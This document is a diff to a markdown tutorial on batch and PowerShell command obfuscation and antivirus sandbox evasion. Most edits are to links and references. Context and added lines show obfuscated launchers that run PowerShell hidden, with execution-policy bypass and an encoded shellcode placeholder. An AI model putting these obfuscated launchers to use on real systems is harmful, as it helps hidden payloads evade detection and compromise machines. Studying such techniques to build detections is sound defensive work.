@@ -27,9 +27,10 @@
 [1] [Batch Obfuscation Technics](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#batch-obfuscation)<br />
 [2] [Bash Obfuscation Technics](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#bash-obfuscation)<br />
 [3] [Powershell Obfuscation Technics](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#powershell-obfuscation)<br />
-[4] [C to ANCII shellcode](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#c-to-ancii-obfuscation)<br />
-[5] [bypass sanbox AVET](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#bypass-the-scan-engine-daniel-sauder-avet)<br />
-[6] [FInal Notes](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#final-notes)<br />
+[4] [C to ANCII Obfuscated shellcode](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#c-to-ancii-obfuscation)<br />
+[5] [Bypass Sanbox Execution (AVET)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#bypass-the-scan-engine-daniel-sauder-avet)<br />
+[6] [FInal Notes - Remarks](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#final-notes)<br />
+[7] [Special Thanks - Referencies](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#special-thanks-to)<br />
 
 ---
 
@@ -100,6 +101,7 @@ The above string can be obfuscated using the **batch special character: ^** <br 
 
       @echo off
       %comspec% /c p%A%owe%B%rshell.e%C%xe -n%C%op -E%A%xec B%C%yp%B%ass -n%A%oni -e%A%nc $shellcode
+      exit
 
 ![batch obfuscation](http://i.cubeupload.com/nMLRrc.jpg)
 
@@ -122,7 +124,7 @@ The above string can be obfuscated using the **batch special character: ^** <br 
 
 ![batch obfuscation](http://i.cubeupload.com/5gkOX8.jpg)
 
-[!] [Description of %varObj% MasterKey](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/pedro-Wandoelmo-key.md)<br />
+[!] [Description of %varObj% MasterKey (importante reading to understand the mechanism)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/pedro-Wandoelmo-key.md)<br />
 
 ---
 
@@ -332,7 +334,6 @@ from $env:comspec variable and use the **-Join ''** operator to take the array a
       Using -f (reorder) switch to re-order the strings in there correct order, the switch
       -f accepts strings separated by a comma, and the caret {} contains the string position
       after the -f switch.. HINT: {0} == {vice} | {3} == {et-} | {1} == {Ser} | {2} == {G}
-      [Special thanks to: @danielbohannon]
 
 - Using **splatting + reorder** (-f) obfuscation technic
 
@@ -353,6 +354,7 @@ from $env:comspec variable and use the **-Join ''** operator to take the array a
 
 ![powershell obfuscation](http://i.cubeupload.com/RG5OKP.jpg)
 
+[*] [All Hail to ''@danielbohannon'' for its extraordinary work under powershell](https://www.sans.org/summit-archives/file/summit-archive-1492186586.pdf)<br />
 [0] [Glosario](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario)<br />
 
 ---
@@ -529,14 +531,14 @@ from $env:comspec variable and use the **-Join ''** operator to take the array a
 
       Its never to late to remmenber that diferent technics can be combined together to achieve
       better results. The next example shows one powershell payload embbebed into one template.bat
-      using 5 diferent batch obfuscation technics found in this article:
+      using 5 diferent batch obfuscation technics found in this article (only batch technics):
 
 <br />
 
       DE-OBFUSCATED : cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $ENCODED-SHELLCODE-STRING
-      OBFUSCATED    : @c^Md%i:~63,1%e^xE %i:~62,1%c pO^w%U7%he^L^l%i:~63,1%e^xE %H%%E0%p -%i:~25,1%%i:~44,1%n^D %i:~7,1%id^D%k8% %H%ex^EC %i:~1,1%%i:~24,1%P^a%i:~53,1%s %H%n^o%w2% -%k8%c $ENCODED-SHELLCODE-STRING
+      OBFUSCATED    : @c^Md%i:~63,1%e^x%i:~3,1% %i:~62,1%c pO^w%U7%h%i:~3,1%L^l%i:~63,1%e^xE %H1%%E0%p -%i:~25,1%%i:~44,1%n^D %i:~7,1%id^D%k8% %H1%ex^EC %i:~1,1%%i:~24,1%P^a%i:~53,1%s %H1%n^o%w2% -%k8%c $ENCODED-SHELLCODE-STRING
 
-[!] [the template can be view here](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario)<br />
+[!] [The above OBFUSCATED syscall (string) its embbebed into this demo template.bat](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario)<br />
 [0] [Glosario](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario)<br />
 
 ---
@@ -549,13 +551,12 @@ from $env:comspec variable and use the **-Join ''** operator to take the array a
 <br />
 
 ### Referencies
-[1] https://twitter.com/404death<br />
-[2] https://github.com/govolution/avepoc<br />
-[3] https://www.sans.org/summit-archives/file/summit-archive-1492186586.pdf<br />
-[4] https://blog.varonis.com/powershell-obfuscation-stealth-through-confusion-part-i/<br />
-[5] http://www.danielbohannon.com/blog-1/2016/10/1/invoke-obfuscation-v11-release-sunday-oct-9<br />
-[6] https://malwaretips.com/threads/how-to-de-obfuscate-powershell-script-commands-examples.76369/<br />
-[7] http://www.danielbohannon.com/blog-1/2017/3/12/powershell-execution-argument-obfuscation-how-it-can-make-detection-easier<br />
+[1] https://github.com/govolution/avepoc<br />
+[2] https://www.sans.org/summit-archives/file/summit-archive-1492186586.pdf<br />
+[3] https://blog.varonis.com/powershell-obfuscation-stealth-through-confusion-part-i/<br />
+[4] http://www.danielbohannon.com/blog-1/2016/10/1/invoke-obfuscation-v11-release-sunday-oct-9<br />
+[5] https://malwaretips.com/threads/how-to-de-obfuscate-powershell-script-commands-examples.76369/<br />
+[6] http://www.danielbohannon.com/blog-1/2017/3/12/powershell-execution-argument-obfuscation-how-it-can-make-detection-easier<br />
 
 <br />
 
